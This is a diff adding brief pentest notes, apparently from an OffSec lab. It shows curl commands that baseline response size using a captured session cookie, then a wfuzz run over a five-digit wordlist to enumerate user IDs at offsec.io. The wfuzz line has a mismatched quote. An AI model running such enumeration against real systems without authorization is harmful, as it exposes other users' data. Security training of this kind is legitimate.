@@ -1,0 +1,17 @@
+/usr/share/seclist/Fuzzing/5-digits-00000-99999.txt
+
+curl -s http://offsec.io?uid=1553 -w '%{size_download}'
+
+
+do a curl with seassion cookie ID from burp login intercept
+
+
+curl -s /dev/null http://offsec.io?uid=1553 -w '%{size_download}' --header "Cookie: PHPSESSID=avsaljkbhvflias135353215156"
+
+
+will generate  a response size copy it then
+
+
+now do fuzz :
+
+wfuzz -c -z file,/usr/share/seclist/Fuzzing/5-digits-00000-99999.txt --hc 404 -hh 2873 -H "Cookie: "PHPSESSID=avsaljkbhvflias135353215156" https://offsec.io/users/uid?=FUZZ
